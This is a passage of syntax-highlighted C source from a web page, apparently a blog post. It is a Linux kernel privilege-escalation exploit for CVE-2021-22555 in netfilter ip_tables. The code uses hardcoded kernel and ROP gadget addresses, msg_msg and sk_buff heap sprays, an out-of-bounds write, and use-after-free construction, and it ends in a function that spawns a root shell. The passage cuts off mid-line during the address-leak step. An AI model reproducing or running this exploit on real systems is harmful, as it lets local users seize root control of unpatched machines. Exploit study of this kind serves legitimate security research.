class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82a63be0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_PROXY 0xffffffff82a639a0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_RET 0xffffffff811594bd</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RAX_POP_RDI_RET 0xffffffff81159547</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810c7d40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810cfc90</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_eflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, esp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next,</span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> m_list_prev, <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts, </span><br><span class="hljs-params">    <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>        &#123;<br>            <span class="hljs-comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span><br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++)<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> socket_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">attribute__</span>((__<span class="hljs-title">packed__</span>)) &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_replace</span> <span class="hljs-title">replace</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipt_entry</span> <span class="hljs-title">entry</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_match</span> <span class="hljs-title">match</span>;</span><br>        <span class="hljs-type">char</span> pad[<span class="hljs-number">0x108</span> + PRIMARY_MSG_SIZE - <span class="hljs-number">0x200</span> - <span class="hljs-number">0x2</span>];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">xt_entry_target</span> <span class="hljs-title">target</span>;</span><br>    &#125; data = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    data.replace.num_counters = <span class="hljs-number">1</span>;<br>    data.replace.num_entries = <span class="hljs-number">1</span>;<br>    data.replace.size = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    <br>    data.entry.next_offset = <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match)<br>            + <span class="hljs-keyword">sizeof</span>(data.pad) + <span class="hljs-keyword">sizeof</span>(data.target);<br>    data.entry.target_offset = <br>            <span class="hljs-keyword">sizeof</span>(data.entry) + <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <br>    data.match.u.user.match_size = <span class="hljs-keyword">sizeof</span>(data.match) + <span class="hljs-keyword">sizeof</span>(data.pad);<br>    <span class="hljs-built_in">strcpy</span>(data.match.u.user.name, <span class="hljs-string">&quot;icmp&quot;</span>);<br>    data.match.u.user.revision = <span class="hljs-number">0</span>;<br><br>    data.target.u.user.target_size = <span class="hljs-keyword">sizeof</span>(data.target);<br>    <span class="hljs-built_in">strcpy</span>(data.target.u.user.name, <span class="hljs-string">&quot;NFQUEUE&quot;</span>);<br>    data.target.u.user.revision = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">// partial overwrite the next object</span><br>    <span class="hljs-keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="hljs-keyword">sizeof</span>(data)))<br>        <span class="hljs-keyword">if</span> (errno == ENOPROTOOPT)<br>            errExit(<span class="hljs-string">&quot;ip_tables module is not loaded!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         socket_fd;<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br><br>    saveStatus();<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.O</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// ident namespace</span><br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);<br><br>    <span class="hljs-comment">// run the exp on specific core only</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-comment">// socket to trigert off-by-null</span><br>    <span class="hljs-keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to create socket!&quot;</span>);<br>    <br>    <span class="hljs-comment">// socket pairs to spray sk_buff</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++)<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">// build 4096 message queue</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">// spray primary and secondary message</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br>        <span class="hljs-keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// create hole in primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, <br>                <span class="hljs-keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// triger off-by-null on primary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(socket_fd);<br><br>    <span class="hljs-comment">// find the queues that have the same secondary msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">1024</span>) == <span class="hljs-number">0</span>)  <span class="hljs-comment">// the hole</span><br>            <span class="hljs-keyword">continue</span>;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG)<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i)<br>        &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, <br>            victim_qid, real_qid);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// free the victim secondary msg_msg, then we get a UAF</span><br>    <span class="hljs-keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">// spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    <br>    <span class="hljs-comment">// use fake msg_msg to read OOB</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, <br>            nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">// release and re-spray sk_buff to construct fake msg_msg</span><br>    <span class="hljs-comment">// so that we can make an arbitrary read on a primary msg_msg</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, <br>            <span class="hljs-keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_secondary_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span 